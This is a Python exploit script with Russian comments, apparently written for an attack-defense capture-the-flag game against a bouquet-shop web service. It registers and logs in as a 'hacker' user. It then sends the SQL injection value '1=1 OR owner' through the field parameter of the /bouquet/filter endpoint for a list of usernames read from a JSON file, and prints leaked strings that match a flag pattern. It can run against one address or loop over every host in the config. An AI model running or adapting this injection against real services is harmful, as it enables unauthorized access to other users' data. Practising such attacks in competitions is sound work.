#!/usr/bin/env python3
import sys
import os
import json
import re
import requests
import urllib.parse

# ——— Константы ———
SCRIPT_DIR    = os.path.dirname(__file__)
JSON_CFG_PATH = os.path.join(SCRIPT_DIR, 'bouqute.json')
DEFAULT_PORT  = 5000
USERNAME      = 'hacker'
PASSWORD      = 'hacker'
EMAIL         = 'hacker@mail.ru'
INJ_FIELD     = '1=1 OR owner'
FLAG_REGEX    = re.compile(r'[A-Za-z0-9]{10,}=')

def parse_target(arg):
    """
    Возвращает (ip, base_url) из аргумента:
      'IP', 'IP:PORT', 'http://IP', 'http://IP:PORT'
    """
    if '://' in arg:
        p = urllib.parse.urlparse(arg)
        ip = p.hostname
        port = p.port or DEFAULT_PORT
    else:
        parts = arg.split(':', 1)
        ip = parts[0]
        port = int(parts[1]) if len(parts) == 2 else DEFAULT_PORT
    return ip, f'http://{ip}:{port}'

def load_json():
    """Загрузить весь JSON-конфиг."""
    with open(JSON_CFG_PATH, encoding='utf-8') as f:
        return json.load(f)

def exploit_host(ip, base_url, users):
    """Регистрация, логин и SQL-инъекция по списку юзеров."""
    session = requests.Session()
    session.headers.update({
        'User-Agent':      'Mozilla/5.0',
        'Accept':          '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    })

    # Регистрация и логин
    session.post(f'{base_url}/register',
                 data={'username': USERNAME, 'password': PASSWORD, 'email': EMAIL},
                 timeout=5).raise_for_status()
    session.post(f'{base_url}/login',
                 data={'username': USERNAME, 'password': PASSWORD},
                 timeout=5).raise_for_status()

    # Эксплуатация
    for user in users:
        resp = session.get(f'{base_url}/bouquet/filter',
                           params={'field': INJ_FIELD, 'value': user},
                           timeout=5)
        for flag in FLAG_REGEX.findall(resp.text or ''):
            print(flag, flush=True)

def main():
    cfg = load_json().get('bouquets', {})

    # MODE = per-team, если есть аргумент, иначе not-per-team
    if len(sys.argv) == 2:
        # пер-тиме: атакуем только sys.argv[1]
        target = sys.argv[1]
        ip, base = parse_target(target)
        raw = cfg.get(ip, [])
        users = []
        for entry in raw:
            try:
                obj = json.loads(entry)
                if obj.get('location') == 'bouquet_description':
                    users.append(obj['username'])
            except json.JSONDecodeError:
                continue
        if not users:
            print(f'[!] No targets for {ip}', file=sys.stderr)
            return
        exploit_host(ip, base, users)

    elif len(sys.argv) == 1:
        # not-per-team: один запуск — все цели из JSON
        for ip, raw in cfg.items():
            users = []
            for entry in raw:
                try:
                    obj = json.loads(entry)
                    if obj.get('location') == 'bouquet_description':
                        users.append(obj['username'])
                except json.JSONDecodeError:
                    continue
            if not users:
                continue
            base = f'http://{ip}:{DEFAULT_PORT}'
            try:
                exploit_host(ip, base, users)
            except Exception as e:
                print(f'[!] Error on {ip}: {e}', file=sys.stderr)
    else:
        print(f'Usage: {sys.argv[0]} [<team_addr>]', file=sys.stderr)
        sys.exit(1)

if __name__ == '__main__':
    main()
